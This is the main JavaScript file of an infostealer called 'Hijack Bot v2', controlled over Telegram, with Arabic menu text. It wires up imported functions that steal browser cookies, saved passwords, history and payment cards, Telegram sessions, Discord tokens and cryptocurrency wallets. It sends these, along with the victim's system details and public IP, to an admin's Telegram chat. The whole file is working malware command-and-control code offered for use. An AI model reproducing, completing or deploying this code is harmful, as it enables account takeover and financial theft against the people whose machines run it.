import "dotenv/config";
import http from "node:http";
import TelegramBot from "node-telegram-bot-api";

import { getSystemInfo, getPublicIP } from "./system.js";
import { stealBrowsers } from "./browsers.js";
import { stealTelegramSessions } from "./telegram.js";
import { stealDiscordTokens } from "./discord.js";
import { stealWallets } from "./wallets.js";

const TOKEN = process.env.BOT_TOKEN;
const ADMIN = String(process.env.ADMIN_ID || "");
const PORT = process.env.PORT || 3000;

if (!TOKEN) {
  console.error("BOT_TOKEN غير موجود");
  process.exit(1);
}
if (!ADMIN) {
  console.error("ADMIN_ID غير موجود");
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

const isAdmin = (msg) => String(msg.from?.id) === ADMIN;

const MENU = `Hijack Bot v2

/dump - جمع كل شيء
/sys - معلومات النظام
/browsers - المتصفحات
/telegram - جلسات تيليغرام
/discord - توكنات ديسكورد
/wallets - محافظ كريبتو
/id - رقمك`;

async function collectAll() {
  const ip = await getPublicIP();
  return {
    timestamp: new Date().toISOString(),
    system: getSystemInfo(),
    ip,
    browsers: stealBrowsers(),
    telegram: stealTelegramSessions(),
    discord: stealDiscordTokens(),
    wallets: stealWallets(),
  };
}

function sendLong(chatId, text) {
  const MAX = 4000;
  if (text.length <= MAX) return bot.sendMessage(chatId, text);
  for (let i = 0; i < text.length; i += MAX) {
    bot.sendMessage(chatId, text.slice(i, i + MAX));
  }
}

bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg)) return;
  bot.sendMessage(msg.chat.id, MENU);
});

bot.onText(/\/id/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "IDك: " + msg.from.id + "\n" +
    "اسمك: " + (msg.from.first_name || "-") + "\n" +
    "يوزرك: @" + (msg.from.username || "-")
  );
});

bot.onText(/\/sys/, async (msg) => {
  if (!isAdmin(msg)) return;
  const sys = getSystemInfo();
  const ip = await getPublicIP();
  sendLong(msg.chat.id, JSON.stringify({ ...sys, ip }, null, 2));
});

bot.onText(/\/dump/, async (msg) => {
  if (!isAdmin(msg)) return;
  bot.sendMessage(msg.chat.id, "جمع البيانات...");
  try {
    const report = await collectAll();
    sendLong(msg.chat.id, JSON.stringify(report, null, 2));
  } catch (e) {
    bot.sendMessage(msg.chat.id, "خطأ: " + e.message);
  }
});

bot.onText(/\/browsers/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealBrowsers();
  sendLong(
    msg.chat.id,
    "Cookies: " + data.cookies.length + "\n" +
    "Passwords: " + data.passwords.length + "\n" +
    "History: " + data.history.length + "\n" +
    "Cards: " + data.cards.length
  );
});

bot.onText(/\/telegram/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealTelegramSessions();
  sendLong(
    msg.chat.id,
    "tdata: " + data.tdata.length + "\n" +
    "sessions: " + data.sessions.length
  );
});

bot.onText(/\/discord/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealDiscordTokens();
  sendLong(
    msg.chat.id,
    "Tokens: " + data.tokens.length + "\n\n" + (data.tokens.join("\n") || "لا يوجد")
  );
});

bot.onText(/\/wallets/, async (msg) => {
  if (!isAdmin(msg)) return;
  const data = stealWallets();
  sendLong(msg.chat.id, "Wallets: " + data.wallets.length);
});

bot.on("polling_error", (err) => {
  console.error("[POLLING]", err.message);
});

// HTTP server لـ Render
http
  .createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
    res.end("Hijack Bot running");
  })
  .listen(PORT, () => {
    console.log("HTTP listening on port " + PORT);
  });

console.log("Hijack Bot v2 شغال...");
